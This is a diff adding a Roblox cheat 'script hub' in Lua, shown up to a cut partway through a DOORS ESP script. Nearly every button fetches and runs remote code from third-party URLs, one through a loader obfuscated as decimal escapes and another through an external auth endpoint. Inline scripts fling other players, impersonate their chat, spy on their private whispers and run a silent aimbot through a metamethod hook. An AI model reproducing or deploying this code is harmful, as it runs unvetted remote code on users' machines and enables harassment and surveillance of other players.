@@ -1,0 +1,1120 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("PocketScripts", "BloodTheme")
+
+
+local Tab = Window:NewTab("ScriptsForYou🔥")
+local Section = Tab:NewSection("By xAgent74✍")
+Section:NewButton("infiniteyield", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+Section:NewButton("Fee yet gui(fling)", "InjectsFlingScript", function()
+    local lp = game:FindService("Players").LocalPlayer
+
+local function gplr(String)
+	local Found = {}
+	local strl = String:lower()
+	if strl == "all" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			table.insert(Found,v)
+		end
+	elseif strl == "others" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name ~= lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	elseif strl == "me" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name == lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	else
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name:lower():sub(1, #String) == String:lower() then
+				table.insert(Found,v)
+			end
+		end 
+	end
+	return Found 
+end
+
+local function notif(str,dur)
+	game:FindService("StarterGui"):SetCore("SendNotification", {
+		Title = "yeet gui",
+		Text = str,
+		Icon = "rbxassetid://2005276185",
+		Duration = dur or 3
+	})
+end
+
+--// sds
+
+local h = Instance.new("ScreenGui")
+local Main = Instance.new("ImageLabel")
+local Top = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local TextBox = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+
+h.Name = "h"
+h.Parent = game:GetService("CoreGui")
+h.ResetOnSpawn = false
+
+Main.Name = "Main"
+Main.Parent = h
+Main.Active = true
+Main.Draggable = true
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
+Main.Size = UDim2.new(0, 454, 0, 218)
+Main.Image = "rbxassetid://2005276185"
+
+Top.Name = "Top"
+Top.Parent = Main
+Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
+Top.BorderSizePixel = 0
+Top.Size = UDim2.new(0, 454, 0, 44)
+
+Title.Name = "Title"
+Title.Parent = Top
+Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(0, 0, 0.295454562, 0)
+Title.Size = UDim2.new(0, 454, 0, 30)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "FE Yeet Gui"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+TextBox.Parent = Main
+TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
+TextBox.Size = UDim2.new(0, 388, 0, 62)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "Eat them (username can be shortened)"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextScaled = true
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+
+TextButton.Parent = Main
+TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
+TextButton.Size = UDim2.new(0, 359, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Eat em'"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextButton.MouseButton1Click:Connect(function()
+	local Target = gplr(TextBox.Text)
+	if Target[1] then
+		Target = Target[1]
+		
+		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
+		Thrust.Force = Vector3.new(9999,9999,9999)
+		Thrust.Name = "YeetForce"
+		repeat
+			lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+			Thrust.Location = Target.Character.HumanoidRootPart.Position
+			game:FindService("RunService").Heartbeat:wait()
+		until not Target.Character:FindFirstChild("Head")
+	else
+		notif("Invalid player")
+	end
+end)
+
+--//fsddfsdf
+notif("Loaded successfully! Created by xAgent74", 5)
+end)
+Section:NewButton("CopyPlayerMessages", "SayWhatThePlayerSaid(Copy him)", function()
+    wait(.2)
+blacklist = {"dangq","goofymf"}
+local reversetext = false
+function newtag(plr)
+    admintag = Instance.new("BoolValue")
+    admintag.Parent = game.Players[plr]
+    admintag.Value = true
+    admintag.Name = "admin"
+    print("created admin tag for " .. plr)
+end
+game.Players.LocalPlayer.ChildRemoved:connect(function(obj)
+    if obj.Name == "admin" then
+        newtag(game.Players.LocalPlayer.Name)
+    end
+end)
+function adminexe(plr,msg)
+    local lower = string.lower(msg)
+    local len = string.len(lower)
+    for i=1,#blacklist do
+        if string.find(plr.Name, blacklist[i]) then
+            if reversetext == false then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                    msg,
+                    "All"
+                )
+                game.Players:Chat(msg)
+            elseif reversetext == true then
+                dabreverse = string.reverse(msg)
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                    dabreverse,
+                    "All"
+                )
+            end
+        end
+    end
+end
+game.Players.LocalPlayer.Chatted:connect(function(msg)
+    adminexe(game.Players.LocalPlayer,msg)
+end)
+function start(plr)
+    local found = false
+    for i=1,#blacklist do
+        if plr.Name == (blacklist[i]) then
+            found = true
+        end
+    end
+    if found == true then
+        newtag(plr.Name)
+        plr.Chatted:connect(function(msg)
+            adminexe(plr,msg)
+        end)
+    end
+end
+game.Players.PlayerAdded:connect(function(plr)
+    start(plr)
+end)
+local creditsdab = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local aidez = Instance.new("ImageLabel")
+local names = Instance.new("TextLabel")
+local scriptmadeby = Instance.new("TextLabel")
+local scriptmadeby_2 = Instance.new("TextLabel")
+local x = Instance.new("TextButton")
+creditsdab.Name = "creditsdab"
+creditsdab.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Frame.Parent = creditsdab
+Frame.BackgroundColor3 = Color3.new(1, 1, 1)
+Frame.Position = UDim2.new(0.399554282, 0, 0.241054624, 0)
+Frame.Size = UDim2.new(0, 274, 0, 274)
+aidez.Name = "aidez"
+aidez.Parent = Frame
+aidez.BackgroundColor3 = Color3.new(1, 1, 1)
+aidez.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+aidez.Position = UDim2.new(-0.000740621239, 0, 0.000178694725, 0)
+aidez.Size = UDim2.new(0, 274, 0, 274)
+aidez.Image = "rbxassetid://0&hash=1f4850af628f3f952e6d4776051738e1"
+names.Name = "names"
+names.Parent = Frame
+names.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+names.BackgroundTransparency = 0.30000001192093
+names.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+names.Position = UDim2.new(0, 0, 0.897810221, 0)
+names.Size = UDim2.new(0, 274, 0, 28)
+names.Font = Enum.Font.SourceSans
+names.Text = "Vortexturize | aidez moi | ObitoXDm8OI "
+names.TextColor3 = Color3.new(1, 1, 1)
+names.TextSize = 14
+scriptmadeby.Name = "scriptmadeby"
+scriptmadeby.Parent = Frame
+scriptmadeby.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+scriptmadeby.BackgroundTransparency = 0.30000001192093
+scriptmadeby.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+scriptmadeby.Position = UDim2.new(0, 0, -0.102189779, 0)
+scriptmadeby.Size = UDim2.new(0, 274, 0, 28)
+scriptmadeby.Font = Enum.Font.SourceSans
+scriptmadeby.Text = "Script created by:"
+scriptmadeby.TextColor3 = Color3.new(1, 1, 1)
+scriptmadeby.TextSize = 14
+scriptmadeby_2.Name = "scriptmadeby"
+scriptmadeby_2.Parent = Frame
+scriptmadeby_2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+scriptmadeby_2.BackgroundTransparency = 0.30000001192093
+scriptmadeby_2.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+scriptmadeby_2.Position = UDim2.new(0, 0, -0.164233565, 0)
+scriptmadeby_2.Size = UDim2.new(0, 274, 0, 17)
+scriptmadeby_2.Font = Enum.Font.SourceSans
+scriptmadeby_2.Text = "Copy Cat"
+scriptmadeby_2.TextColor3 = Color3.new(1, 1, 1)
+scriptmadeby_2.TextScaled = true
+scriptmadeby_2.TextSize = 14
+scriptmadeby_2.TextWrapped = true
+x.Name = "x"
+x.Parent = creditsdab
+x.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+x.BackgroundTransparency = 0.30000001192093
+x.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+x.Position = UDim2.new(0.600445747, 0, 0.188323915, 0)
+x.Size = UDim2.new(0, 28, 0, 28)
+x.Font = Enum.Font.SourceSansSemibold
+x.Text = "X"
+x.TextColor3 = Color3.new(1, 1, 1)
+x.TextSize = 30
+x.MouseButton1Click:connect(function()
+    creditsdab:Destroy()
+end)
+local Toggle = Instance.new("ScreenGui")
+local Drag = Instance.new("TextButton")
+local Background = Instance.new("ImageLabel")
+local Uncopy = Instance.new("TextButton")
+local Copy = Instance.new("TextButton")
+local Input = Instance.new("TextBox")
+local Box = Instance.new("Frame")
+local Reverse = Instance.new("TextButton")
+Toggle.Name = "Toggle"
+Toggle.Parent = game.CoreGui
+Drag.Name = "Drag"
+Drag.Parent = Toggle
+Drag.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Drag.BackgroundTransparency = 0.9990000128746
+Drag.BorderColor3 = Color3.new(1, 1, 1)
+Drag.Draggable = true
+Drag.Position = UDim2.new(0.788501024, 0, 0.37571159, 0)
+Drag.Size = UDim2.new(0, 190, 0, 190)
+Drag.Font = Enum.Font.ArialBold
+Drag.Text = ""
+Drag.TextColor3 = Color3.new(1, 1, 1)
+Drag.TextSize = 14
+Drag.TextWrapped = true
+Background.Name = "Background"
+Background.Parent = Drag
+Background.BackgroundColor3 = Color3.new(1, 1, 1)
+Background.Position = UDim2.new(0.00235599279, 0, -0.0012384057, 0)
+Background.Size = UDim2.new(0, 190, 0, 190)
+Background.ZIndex = 0
+Background.Image = "rbxassetid://0&hash=12ed3f0fdc0764ab01645b356df12dc3"
+Uncopy.Name = "Uncopy"
+Uncopy.Parent = Background
+Uncopy.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Uncopy.BackgroundTransparency = 0.80000001192093
+Uncopy.BorderColor3 = Color3.new(1, 1, 1)
+Uncopy.Position = UDim2.new(0.0473684222, 0, 0.763157904, 0)
+Uncopy.Size = UDim2.new(0, 174, 0, 37)
+Uncopy.ZIndex = 2
+Uncopy.Font = Enum.Font.ArialBold
+Uncopy.Text = "Stop Copying Player"
+Uncopy.TextColor3 = Color3.new(1, 1, 1)
+Uncopy.TextSize = 14
+Uncopy.TextWrapped = true
+Copy.Name = "Copy"
+Copy.Parent = Background
+Copy.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Copy.BackgroundTransparency = 0.80000001192093
+Copy.BorderColor3 = Color3.new(1, 1, 1)
+Copy.Position = UDim2.new(0.0473684222, 0, 0.521052659, 0)
+Copy.Size = UDim2.new(0, 174, 0, 37)
+Copy.ZIndex = 2
+Copy.Font = Enum.Font.ArialBold
+Copy.Text = "Copy Player"
+Copy.TextColor3 = Color3.new(1, 1, 1)
+Copy.TextSize = 14
+Input.Name = "Input"
+Input.Parent = Background
+Input.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Input.BackgroundTransparency = 0.60000002384186
+Input.BorderColor3 = Color3.new(1, 1, 1)
+Input.Position = UDim2.new(0.0421053171, 0, 0.0789474025, 0)
+Input.Size = UDim2.new(0, 174, 0, 37)
+Input.ZIndex = 2
+Input.Font = Enum.Font.ArialBold
+Input.Text = "Username of the person to copy goes here. (Shortened names work.)"
+Input.TextColor3 = Color3.new(1, 1, 1)
+Input.TextScaled = true
+Input.TextSize = 14
+Input.TextWrapped = true
+Box.Name = "Box"
+Box.Parent = Background
+Box.BackgroundColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Box.Position = UDim2.new(0.247368425, 0, 0.957894742, 0)
+Box.Size = UDim2.new(0, 100, 0, 52)
+Box.ZIndex = -3
+Reverse.Name = "Reverse"
+Reverse.Parent = Background
+Reverse.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Reverse.BackgroundTransparency = 0.80000001192093
+Reverse.BorderColor3 = Color3.new(1, 1, 1)
+Reverse.Position = UDim2.new(0.310526311, 0, 1.02229095, 0)
+Reverse.Size = UDim2.new(0, 75, 0, 29)
+Reverse.ZIndex = 2
+Reverse.Font = Enum.Font.ArialBold
+Reverse.Text = "Reverse Off"
+Reverse.TextColor3 = Color3.new(1, 1, 1)
+Reverse.TextScaled = true
+Reverse.TextSize = 14
+Reverse.TextWrapped = true
+Copy.MouseButton1Click:connect(function()
+    local name = string.lower(Input.Text)
+    local player = nil
+    local plrname = nil
+    if name == "others" then
+        for i,v in pairs(game.Players:GetChildren()) do
+            if (not v:FindFirstChild("admin")) and v.Name ~= game.Players.LocalPlayer.Name then
+                table.insert(blacklist,(#blacklist+1),v.Name)
+                v.Chatted:connect(function(msg)
+                    adminexe(v,msg)
+                end)
+            end
+        end
+    else
+        names = game.Players:GetChildren()
+        for i,v in pairs(names) do
+            strlower = string.lower(v.Name)
+            sub = string.sub(strlower,1,#name)
+            if name == sub and (not v:FindFirstChild("admin")) then
+                table.insert(blacklist,(#blacklist+1),v.Name)
+                v.Chatted:connect(function(msg)
+                    adminexe(v,msg)
+                end)
+            end
+        end
+    end
+end)
+ 
+Uncopy.MouseButton1Click:connect(function()
+    local name = string.lower(Input.Text)
+    local player = nil
+    local plrname = nil
+    local index = nil
+    if name == "others" then
+        for i,v in pairs(blacklist) do
+            for i,v in pairs(blacklist) do
+                if v ~= game.Players.LocalPlayer.Name then
+                    table.remove(blacklist,i)
+                end
+            end
+        end
+    else
+        names = blacklist
+        for i,v in pairs(names) do
+            strlower = string.lower(v)
+            sub = string.sub(strlower,1,#name)
+            if name == sub then
+                player = v
+                for i=1,#blacklist do
+                    if string.find(sub, blacklist[i]) then
+                        table.remove(blacklist,i)
+                    end
+ 
+                end
+                table.remove(blacklist,i)
+            end
+        end
+    end
+ 
+end)
+Reverse.MouseButton1Click:connect(function()
+    if reversetext == true then
+        Reverse.Text = "Reverse Off"
+        reversetext = false
+    elseif reversetext == false then
+        Reverse.Text = "Reverse On"
+        reversetext = true
+    end
+end)
+end)
+local Tab = Window:NewTab("Close❌")
+local Section = Tab:NewSection("CloseGUI")
+
+Section:NewKeybind("KeybindText", "Putakeybindforthegui", Enum.KeyCode.K, function()
+	Library:ToggleUI()
+end)
+Section:NewSlider("speed", "makesugoSPEEDY", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+local Tab = Window:NewTab("Bedwars🪐")
+local Section = Tab:NewSection("Scripts")
+Section:NewButton("vapev4forbedwars", "InjectsVapev4", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
+end)
+
+Section:NewButton("MONKEYscript", "InjectsScriptForBedwars", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KuriWasTaken/MonkeyScripts/main/BedWarsMonkey.lua"))()
+end)
+
+Section:NewButton("SlaveDash", "InjectsSlavedashforbedwars", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/SlaveDash/Crokuranu/main/Bedwars%20UI%20Source%20Code'))()
+end)
+
+Section:NewButton("BedwarsHax", "supergamingscript", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperGamingBros4/Roblox-HAX/main/Updated_Totally_Original_Script_Hub.Lua"))()
+end) 
+local Tab = Window:NewTab("Da hood+FanMade⚔")
+local Section = Tab:NewSection("dh+fanmade")
+Section:NewButton("NossLock", "Injectsdahscript", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/WinterTime"))()
+end)
+Section:NewButton("Da hood swagmode", "InjectsSWAGMODE", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002"))()
+end)
+Section:NewButton("Da hood faded", "InjectsFadedscript", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+end)
+Section:NewButton("ChariotsWare", "script for da hood modded or other da hood fan games", function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Rippeed/DaHoodinary/main/chariotsware"))()
+end)
+local Tab = Window:NewTab("BigPaintball🔫")
+local Section = Tab:NewSection("BigpballScripts")
+Section:NewButton("BigPaintballiNext", "InjectsBigPaintballscript", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/radjahfromdiscord/iNEXT/main/source"))()
+end)
+Section:NewButton("BigPaintballEternity", "BigPaintballEternityScript", function()
+    local a="https://eternityhub.xyz/Script"local b=a.."/Eternity.lua"loadstring(game:HttpGet(b))()
+end)
+Section:NewButton("UnfairPaintball", "InjectsUnfairScript", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
+end)
+Section:NewButton("DarkHub(Pb)", "DarkHubForPaintballSs", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
+end)
+local Tab = Window:NewTab("MurderMystery2🔪")
+local Section = Tab:NewSection("MM2scripts")
+Section:NewButton("EclipseHubMM2", "InjectsEclipseHubfmm2", function()
+    --Script--
+getgenv().mainKey = "nil"
+ 
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+end)
+Section:NewButton("VynixMM2", "InjectsVynix", function()
+    loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+end)
+Section:NewButton("MM2bestscript", "injectsbestscriptmm2", function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\106\101\110\115\100\101\118\101\108\111\112\101\114\47\74\101\110\115\72\117\98\47\109\97\105\110\47\83\99\114\105\112\116\34\41\41\40\41\10")()
+end)
+local Tab = Window:NewTab("1Scripts✨")
+local Section = Tab:NewSection("1scriptsforyou")
+Section:NewButton("OwlHub", "InjectsOwlHub", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
+end)
+Section:NewButton("JailbreakVynixius", "InjectsVynixiusforJailbreak", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Jailbreak/Jailbreak"))()
+end)
+Section:NewButton("PiggyVynixius", "InjectVynixiusForPiggy", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Piggy/Piggy"))()
+end)
+Section:NewButton("RainbowFriends", "Borkware", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/BorkWare/main/Scripts/' .. game.GameId .. ".lua"))(' Watermelon ? ')
+end)
+Section:NewButton("FlingThingsAndPeopleStrenght", "thestrenghtis300", function()
+    local bodyvel_Name = "FlingVelocity"
+local userinputs = game:GetService("UserInputService")
+local w = game:GetService("Workspace")
+local r = game:GetService("RunService")
+local d = game:GetService("Debris")
+local strength = 300
+ 
+w.ChildAdded:Connect(function(model)
+    if model.Name == "GrabParts" then
+        local part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
+ 
+        if part_to_impulse then
+            print("Part found!")
+ 
+            local inputObj
+            local velocityObj = Instance.new("BodyVelocity", part_to_impulse)
+ 
+            model:GetPropertyChangedSignal("Parent"):Connect(function()
+                if not model.Parent then
+                    if userinputs:GetLastInputType() == Enum.UserInputType.MouseButton2 then
+                        print("Launched!")
+                        velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                        velocityObj.Velocity = workspace.CurrentCamera.CFrame.lookVector * strength
+                        d:AddItem(velocityObj, 1)
+                    elseif userinputs:GetLastInputType() == Enum.UserInputType.MouseButton1 then
+                        velocityObj:Destroy()
+                        print("Cancel Launch!")
+                    else
+                        velocityObj:Destroy()
+                        print("No two keys pressed!")
+                    end
+                end
+            end)
+        end
+    end
+end)
+end)
+Section:NewButton("KATaimbotScript", "AimbotForKat!", function()
+    getgenv().silentaim_settings = {
+       fov = 150,
+       hitbox = "Head",
+       fovcircle = true,
+    }
+    -- Services
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+     
+    -- Player
+    local Player = Players.LocalPlayer
+    local Mouse = Player:GetMouse()
+    local CurrentCamera = workspace.CurrentCamera
+     
+    local function GetClosest(Fov)
+       local Target, Closest = nil, Fov or math.huge
+     
+       for i,v in pairs(Players:GetPlayers()) do
+           if (v.Character and v ~= Player and v.Character:FindFirstChild(getgenv().silentaim_settings.hitbox)) then
+               local Position, OnScreen = CurrentCamera:WorldToScreenPoint(v.Character[getgenv().silentaim_settings.hitbox].Position)
+               local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+     
+               if (Distance < Closest and OnScreen) then
+                   Closest = Distance
+                   Target = v
+               end
+           end
+       end
+     
+       return Target
+    end
+     
+    local Target
+    local CircleInline = Drawing.new("Circle")
+    local CircleOutline = Drawing.new("Circle")
+    RunService.Stepped:Connect(function()
+       CircleInline.Radius = getgenv().silentaim_settings.fov
+       CircleInline.Thickness = 2
+       CircleInline.Position = Vector2.new(Mouse.X, Mouse.Y + 36)
+       CircleInline.Transparency = 1
+       CircleInline.Color = Color3.fromRGB(255, 255, 255)
+       CircleInline.Visible = getgenv().silentaim_settings.fovcircle
+       CircleInline.ZIndex = 2
+     
+       CircleOutline.Radius = getgenv().silentaim_settings.fov
+       CircleOutline.Thickness = 4
+       CircleOutline.Position = Vector2.new(Mouse.X, Mouse.Y + 36)
+       CircleOutline.Transparency = 1
+       CircleOutline.Color = Color3.new()
+       CircleOutline.Visible = getgenv().silentaim_settings.fovcircle
+       CircleOutline.ZIndex = 1
+     
+       Target = GetClosest(getgenv().silentaim_settings.fov)
+    end)
+     
+    local Old; Old = hookmetamethod(game, "__namecall", function(Self, ...)
+       local Args = {...}
+     
+       if (not checkcaller() and getnamecallmethod() == "FindPartOnRayWithIgnoreList") then
+           if (table.find(Args[2], workspace.WorldIgnore.Ignore) and Target and Target.Character) then
+               local Origin = Args[1].Origin
+     
+               Args[1] = Ray.new(Origin, Target.Character[getgenv().silentaim_settings.hitbox].Position - Origin)
+           end
+       end
+     
+       return Old(Self, unpack(Args))
+    end)
+    end)
+    Section:NewButton("Private chat spy", "Spy private messages", function()
+for i, v in pairs(game.Players:GetChildren()) do
+    v.Chatted:Connect(function(msg)
+    
+    if string.sub(msg, 1, 3) == "/w " then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = tostring(v.Name),
+        Text = tostring(msg),
+        Icon = "",
+        Duration = 10
+    })
+    end
+    
+    end)
+    end
+    
+    game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+    
+    if string.sub(msg, 1, 3) == "/w " then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = tostring(player.Name),
+        Text = tostring(msg),
+        Icon = "",
+        Duration = 10
+    })
+    end
+    
+    end)
+    end)
+    end)
+    Section:NewButton("TypeOrDieScript", "InjectsTypeOrDieScript", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Catsuq/TypeOrDie/maid/TypeOrDie.lua"))()
+    end)
+local Tab = Window:NewTab("DOORS👁️")
+local Section = Tab:NewSection("DOORSscripts")
+Section:NewButton("OminousVibes(DOORS)", "DOORSScript", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OminousVibes-Exploit/Scripts/main/doors/loadstring.lua"))()
+end)
+Section:NewButton("DOORSVynixius", "InjectsDoorsVynixius", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Script.lua"))()
+end)
+Section:NewButton("DOORSorion", "InjectsDOORSorionscript", function()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({IntroText = "Doors GUI v6.9",Name = "Doors", HidePremium = false, SaveConfig = true, ConfigFolder = "DoorsORION"})
+if game.PlaceId == 6516141723 then
+    OrionLib:MakeNotification({
+        Name = "Error",
+        Content = "Please execute when in game, not in lobby.",
+        Time = 2
+    })
+end
+local VisualsTab = Window:MakeTab({
+	Name = "Visuals",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local CF = CFrame.new
+local LatestRoom = game:GetService("ReplicatedStorage").GameData.LatestRoom
+local ChaseStart = game:GetService("ReplicatedStorage").GameData.ChaseStart
+
+local KeyChams = {}
+VisualsTab:AddToggle({
+	Name = "Key Chams",
+	Default = false,
+    Flag = "KeyToggle",
+    Save = true,
+	Callback = function(Value)
+		for i,v in pairs(KeyChams) do
+            v.Enabled = Value
+        end
+	end    
+})
+
+local function ApplyKeyChams(inst)
+    wait()
+    local Cham = Instance.new("Highlight")
+    Cham.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    Cham.FillColor = Color3.new(0.980392, 0.670588, 0)
+    Cham.FillTransparency = 0.5
+    Cham.OutlineColor = Color3.new(0.792156, 0.792156, 0.792156)
+    Cham.Parent = game:GetService("CoreGui")
+    Cham.Adornee = inst
+    Cham.Enabled = OrionLib.Flags["KeyToggle"].Value
+    Cham.RobloxLocked = true
+    return Cham
+end
+
+local KeyCoroutine = coroutine.create(function()
+    workspace.CurrentRooms.DescendantAdded:Connect(function(inst)
+        if inst.Name == "KeyObtain" then
+            table.insert(KeyChams,ApplyKeyChams(inst))
+        end
+    end)
+end)
+for i,v in ipairs(workspace:GetDescendants()) do
+    if v.Name == "KeyObtain" then
+        table.insert(KeyChams,ApplyKeyChams(v))
+    end
+end
+coroutine.resume(KeyCoroutine)
+
+local BookChams = {}
+VisualsTab:AddToggle({
+	Name = "Book Chams",
+	Default = false,
+    Flag = "BookToggle",
+    Save = true,
+	Callback = function(Value)
+		for i,v in pairs(BookChams) do
+            v.Enabled = Value
+        end
+	end    
+})
+
+local FigureChams = {}
+VisualsTab:AddToggle({
+	Name = "Figure Chams",
+	Default = false,
+    Flag = "FigureToggle",
+    Save = true,
+    Callback = function(Value)
+        for i,v in pairs(FigureChams) do
+            v.Enabled = Value
+        end
+    end
+})
+
+local function ApplyBookChams(inst)
+    if inst:IsDescendantOf(game:GetService("Workspace").CurrentRooms:FindFirstChild("50")) and game:GetService("ReplicatedStorage").GameData.LatestRoom.Value == 50 then
+        wait()
+        local Cham = Instance.new("Highlight")
+        Cham.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        Cham.FillColor = Color3.new(0, 1, 0.749019)
+        Cham.FillTransparency = 0.5
+        Cham.OutlineColor = Color3.new(0.792156, 0.792156, 0.792156)
+        Cham.Parent = game:GetService("CoreGui")
+        Cham.Enabled = OrionLib.Flags["BookToggle"].Value
+        Cham.Adornee = inst
+        Cham.RobloxLocked = true
+        return Cham
+    end
+end
+
+local function ApplyEntityChams(inst)
+    wait()
+    local Cham = Instance.new("Highlight")
+    Cham.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    Cham.FillColor = Color3.new(1, 0, 0)
+    Cham.FillTransparency = 0.5
+    Cham.OutlineColor = Color3.new(0.792156, 0.792156, 0.792156)
+    Cham.Parent = game:GetService("CoreGui")
+    Cham.Enabled = OrionLib.Flags["FigureToggle"].Value
+    Cham.Adornee = inst
+    Cham.RobloxLocked = true
+    return Cham
+end
+
+local BookCoroutine = coroutine.create(function()
+    task.wait(1)
+    for i,v in pairs(game:GetService("Workspace").CurrentRooms["50"].Assets:GetDescendants()) do
+        if v.Name == "LiveHintBook" then
+            table.insert(BookChams,ApplyBookChams(v))
+        end
+    end
+end)
+local EntityCoroutine = coroutine.create(function()
+    local Entity = game:GetService("Workspace").CurrentRooms["50"].FigureSetup:WaitForChild("FigureRagdoll",5)
+    Entity:WaitForChild("Torso",2.5)
+    table.insert(FigureChams,ApplyEntityChams(Entity))
+end)
+
+
+local GameTab = Window:MakeTab({
+	Name = "Game",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local CharTab = Window:MakeTab({
+	Name = "Character",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local TargetWalkspeed
+CharTab:AddSlider({
+	Name = "Speed",
+	Min = 0,
+	Max = 50,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+		TargetWalkspeed = Value
+	end    
+})
+
+local pcl = Instance.new("SpotLight")
+pcl.Brightness = 1
